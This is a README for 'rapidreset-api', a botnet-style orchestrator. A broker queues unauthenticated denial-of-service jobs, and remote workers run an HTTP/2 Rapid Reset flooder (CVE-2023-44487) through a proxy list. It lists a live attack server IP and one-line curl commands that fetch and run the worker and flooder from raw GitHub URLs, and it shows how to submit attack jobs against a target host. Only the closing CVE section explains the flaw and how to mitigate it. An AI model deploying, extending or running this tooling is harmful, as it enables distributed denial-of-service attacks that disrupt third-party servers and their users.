<div align="center">

# rapidreset-api

**Orchestrator + remote workers for HTTP/2 Rapid Reset.**

![node](https://img.shields.io/badge/node.js-v24-339933?logo=node.js&logoColor=white)
![javascript](https://img.shields.io/badge/javascript-ES2023-F7DF1E?logo=javascript&logoColor=black)
![http2](https://img.shields.io/badge/HTTP%2F2-RFC%209113-005A9C)
![license](https://img.shields.io/badge/license-mit-8B5CF6)
![status](https://img.shields.io/website?up_message=online&down_message=offline&url=http%3A%2F%2F204.10.194.164%3A3295)

`CVE-2023-44487` · `CWE-400` · CVSS `7.5` HIGH

[Live server](#live-server) · [Client setup](#client-setup) · [API](#api) · [CVE](#cve-2023-44487) · [Notes](#notes)

</div>

---

A single small process (`index.js`) exposes one public endpoint. A worker (`bot/client.js`) connects from any machine, pulls a job, and runs `rapidreset.js` locally. The broker never spawns a process of its own — it only holds the queue and hands each job to an idle worker.

```
client.js  ──HTTP upgrade──▶  index.js  ──job──▶  client.js  ──spawn──▶  rapidreset.js
   worker                       broker               worker                flooder
```

## Layout

| Path | Purpose |
| --- | --- |
| `index.js` | broker, HTTP API, docs page at `/` |
| `method.json` | method list with command templates `<<host>>` `<<time>>` `<<method>>` |
| `start-api.sh` | server bootstrap: fetch `index.js` and `method.json`, start the broker |
| `start-bot.sh` | client bootstrap: fetch worker files, install `hpack`, start `client.js` |
| `bot/client.js` | worker, connects to `index.js` and runs the job command |
| `bot/rapidreset.js` | HTTP/2 flooder, CVE-2023-44487 |
| `bot/proxi.txt` | proxy list, one entry per line |

## Live server

```
http://204.10.194.164:3295
```

| Page | URL |
| --- | --- |
| Interactive docs | http://204.10.194.164:3295/ |
| Submit a job | http://204.10.194.164:3295/api/attack?host=&time=&method= |
| Worker status | http://204.10.194.164:3295/api/workers |

## Server setup

The broker has no dependencies, so nothing to install:

```bash
git clone https://github.com/malasahjagotwin/rapidreset-api.git
cd rapidreset-api
node index.js
```

Or fetch and run it in one step, without cloning:

```bash
curl -fsSLO https://raw.githubusercontent.com/malasahjagotwin/rapidreset-api/main/start-api.sh
chmod +x start-api.sh
./start-api.sh
```

`start-api.sh` downloads `index.js` and `method.json` into its own directory, then starts the broker. It needs `node` and `curl` only — `hpack` is the worker's dependency, not the broker's, so the script does not run `npm install`.

Environment variables:

| Name | Default | Purpose |
| --- | --- | --- |
| `PORT` | `SERVER_PORT`, then `3295` | listening port |
| `HOST` | `0.0.0.0` | listening interface |
| `CLIENT_TOKEN` | empty | when set, workers must send the same header |

On a panel that injects its own port, leave `PORT` unset. Both the script and `index.js` fall back to `SERVER_PORT`.

## Client setup

One line. Downloads the three files, installs `hpack`, starts the worker.

```bash
mkdir -p bot && cd bot \
  && curl -fsSLO https://raw.githubusercontent.com/malasahjagotwin/rapidreset-api/main/bot/client.js \
  && curl -fsSLO https://raw.githubusercontent.com/malasahjagotwin/rapidreset-api/main/bot/rapidreset.js \
  && curl -fsSLO https://raw.githubusercontent.com/malasahjagotwin/rapidreset-api/main/bot/proxi.txt \
  && npm i hpack --no-audit --no-fund \
  && ORCHESTRATOR=http://204.10.194.164:3295 node client.js
```

Or use the script, which does the same with dependency checks:

```bash
curl -fsSLO https://raw.githubusercontent.com/malasahjagotwin/rapidreset-api/main/start-bot.sh
chmod +x start-bot.sh
./start-bot.sh
```

`start-bot.sh` takes an optional target directory as its first argument (default `bot`), downloads the three worker files, installs `hpack` only when it is missing, then runs `client.js`. It reads the same environment variables, with `CLIENT_TOKEN` defaulting to empty so it matches a server without a token.

```bash
ORCHESTRATOR=http://10.0.0.5:3295 MAX_CONCURRENT=2 WORKER_NAME=node-01 ./start-bot.sh worker-a
```

With a token:

```bash
CLIENT_TOKEN=secret ORCHESTRATOR=http://204.10.194.164:3295 node client.js
```

Repeat the same command on any other machine to add workers. Several parallel jobs per machine:

```bash
MAX_CONCURRENT=2 ORCHESTRATOR=http://204.10.194.164:3295 node client.js
```

## API

```
GET /api/attack?host=<url>&time=<seconds>&method=<name>
```

| Parameter | Required | Description |
| --- | --- | --- |
| `host` | yes | target URL, `http://` or `https://`, no whitespace |
| `time` | yes | duration in seconds, `1`–`300` (legacy alias: `itme`) |
| `method` | yes | a name from `method.json` |

```bash
curl "http://204.10.194.164:3295/api/attack?host=https://example.com&time=30&method=rapidreset"
```

```json
{
  "ok": true,
  "id": "4b7d1c2e-...",
  "status": "queued",
  "method": "rapidreset",
  "host": "https://example.com",
  "time": 30,
  "statusUrl": "/api/attack/4b7d1c2e-..."
}
```

Responds `202`, execution happens on the worker. Poll `statusUrl` while the job is `queued` or `running`.

### Endpoints

| Endpoint | Method | Purpose |
| --- | --- | --- |
| `/` | GET | docs page |
| `/api/attack` | GET | submit a job |
| `/api/attack/<id>` | GET | job status |
| `/api/workers` | GET | connected workers and queue depth |
| `/api/worker` | GET + Upgrade | primary worker channel |
| `/api/worker/signal` | POST | fallback channel when `Upgrade` is blocked by a proxy |

## Adding a method

Edit `method.json`:

```json
[
  {
    "name": "rapidreset",
    "command": "node rapidreset.js GET <<host>> <<time>> 1 64 proxi.txt",
    "description": "CVE-2023-44487"
  }
]
```

Only `<<host>>`, `<<time>>`, and `<<method>>` are recognized. Any other placeholder makes the request fail.

## CVE-2023-44487

HTTP/2 Rapid Reset, published 10 October 2023, CVSS 7.5 HIGH, CWE-400 uncontrolled resource consumption. It drove Google to record 398 million rps and Cloudflare 201 million rps — the largest DDoS seen at the time.

HTTP/2 allows many streams inside one TCP/TLS connection. Every new stream forces the server to allocate context: HPACK parser state, a stream state machine, buffers, and a slot under `SETTINGS_MAX_CONCURRENT_STREAMS`.

The attack exploits the ordering of that work. A client opens a stream with `HEADERS`, then immediately sends `RST_STREAM`, cancelling the stream before the server finishes allocating its context. Cancellation is processed faster than allocation, so the concurrent stream limit is never reached. The server still pays the work, then discards it. The loop repeats for as long as the connection lives, so a single connection can trigger tens of thousands of streams per second.

The fix is not in the parser but in stream policy: cap `SETTINGS_MAX_CONCURRENT_STREAMS` aggressively, do not free stream state the moment `RST_STREAM` arrives, and add a per-connection stream quota. Go `net/http`, nginx, Apache httpd, Envoy, HAProxy, and Node.js all shipped fixes in October 2023.

| Field | Value |
| --- | --- |
| CVE | `CVE-2023-44487` |
| Name | HTTP/2 Rapid Reset |
| CWE | `CWE-400` |
| CVSS | `7.5` HIGH — `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` |
| Published | 2023-10-10 |
| Impact | Denial of service |
| Mitigation | per-connection stream limits, `RST_STREAM` handling |

## Notes

- `/api/attack` has no authentication. Anyone who can reach the URL can submit a job and have it executed by a connected worker.
- A worker that disconnects mid-job fails that job after a 60 second timeout.
- The queue holds 32 waiting jobs; the rest are rejected with `503`.